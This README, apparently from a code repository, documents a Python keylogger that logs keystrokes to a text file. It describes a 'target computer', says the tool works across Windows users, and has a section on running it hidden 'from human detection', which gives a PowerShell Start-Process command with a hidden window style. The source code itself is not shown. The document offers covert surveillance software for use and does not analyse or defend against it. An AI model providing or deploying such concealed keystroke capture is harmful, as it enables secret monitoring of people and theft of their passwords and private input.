# Keylogger

Keylogger logic using [this keyboard repository](https://github.com/boppreh/keyboard). Currently works as a keylogger for the local computer. 
Can be used across users on Windows. Meant to be used via the terminal.
- NOTE: instructions below are targeted for Windows users, other Operating Systems may need to use different commands etc.

## Target computer requirements
- Must have python installed and be able to use from the command prompt or terminal
- must run the command "pip install keyboard" to download the dependency

## How to use
- Open command prompt/terminal
- Change directory to the folder where you have the script
  - for example: "cd filePath"
  - IMPORTANT: changing the directory ensures the keystrokes are written into the text file where the script is
- Run the script from the command prompt/terminal
  - for example: "python C:\filePath\main.py"
 
## How to run script in background to hide from human detection
- Open a new Notepad file
- Write the following commands:
  - cd "c:\filePath"
  - $process = Start-Process -FilePath "python" -ArgumentList ".\main.py" -WindowStyle Hidden -PassThru
- Save Notepad file as a .ps1 file
- To run, right click file and select "Run with PowerShell"
- Now the script should be running in the background :)

## Key features
- Program will keep recording keystrokes and writing them into a text file until you press the "escape" key (subject to change)
- Upon the "enter" key being pressed, a new line and a label notating that the user pressed the "enter" key is written in the text file
